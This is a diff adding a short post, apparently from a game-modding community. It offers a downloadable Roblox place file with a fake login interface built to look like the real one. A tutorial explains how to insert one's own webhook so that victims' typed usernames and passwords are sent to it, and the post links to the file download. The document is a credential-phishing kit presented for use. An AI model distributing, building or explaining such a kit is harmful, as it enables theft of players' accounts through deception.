@@ -1,0 +1,10 @@
+https://cdn.discordapp.com/attachments/841259422299062293/841296801659093042/unknown.png
+FYI the roblox mouse icon is the "window mouse icon"
+
+here's the real one compared to the one i made
+https://cdn.discordapp.com/attachments/841259422299062293/841297020978331699/unknown.png
+fixing webhook and password box
+Quick Tutorial on how to use:
+
+Download the .RBXL file go to serverscripts and put your webhook inside of "PUTYOURWEBHOOKHERE", after you do that save your game and play it once you type your username and password in it'll get sent to the webhook.
+https://www.mediafire.com/file/xuuqrkcdh1u0wd9/StudioMGUI.rbxl/file
